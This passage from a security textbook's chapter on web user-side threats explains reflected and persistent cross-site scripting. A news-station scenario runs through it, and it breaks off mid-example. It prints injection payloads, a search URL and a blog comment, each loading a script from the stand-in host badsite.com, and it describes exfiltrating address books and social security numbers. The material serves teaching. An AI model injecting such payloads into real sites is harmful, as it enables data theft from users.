@@ -1,0 +1,54 @@
+262 Chapter 4  
+The Web—User Side
+and a marketing advantage for KCTV (because the station keeps the user on its web 
+site). The search query is loaded with parameters to help KCTV display the results; 
+
+Google interprets the parameters for it and returns the remaining parameters unread and 
+unmodified in the result to KCTV. These parameters become a script attached to the 
+
+query and executed by any responding party along the way.
+The interaction language between a client and server is simple in syntax and rich in 
+effect. Communications between client and server must all be represented in plain text, 
+
+because the web page protocol (http) uses only plain text. To render images or sounds, 
+
+special effects such as pop-up windows or flashing text, or other actions, the http string 
+
+contains embedded scripts, invoking Java, ActiveX, or other executable code. These 
+
+programs run on the client’s computer within the browser’s context, so they can do or 
+
+access anything the browser can, which usually means full access to the user’s data 
+
+space as well as full capability to send and receive over a network connection.
+How is access to user’s data a threat? A script might look for any file named address_
+book and send it to spam_target.com, where an application would craft spam messages 
+
+to all the addresses, with the user as the apparent sender. Or code might look for any 
+
+file containing numbers of the form ddd-dd-dddd (the standard format of a U.S. social 
+
+security number) and transmit that file to an identity thief. The possibilities are endless.
+The search and response URL we listed could contain a script as follows:
+http://www.google.com/search?name=<SCRIPT  SRC=http://badsite.com/xss.js></SCRIPT> 
+&q=cross+site+scripting&ie=utf-8&oe=utf-8 
+&aq=t&rls=org.mozilla:en-US:official 
+&client=firefox-a&lr=lang_enThis string would connect to badsite.com where it would execute the Java script xss that 
+could do anything allowed by the user’s security context.
+Remember that the browser and server pass these parameters back and forth to main-
+tain context between a server and the user’s session. Sometimes a volley from the client 
+
+will contain a script for the server to execute. The attack can also harm the server side 
+
+if the server interprets and executes the script or saves the script and returns it to other 
+
+clients (who would then execute the script). Such behavior is called a 
+persistent cross-
+site scripting attack. An example of such an attack could occur in a blog or stream of 
+comments. Suppose station KCTV posted news stories online about which it invited 
+
+users to post comments. A malicious user could post a comment with embedded HTML 
+
+containing a script, such as Cool<br>story.<br>KCTVBigFan<script  src=http://badsite.com/xss.js></script>from the script source we just described. Other users who opened the comments area would automatically download the previous comments and see
+Cool story. 
+KCTVBigFan
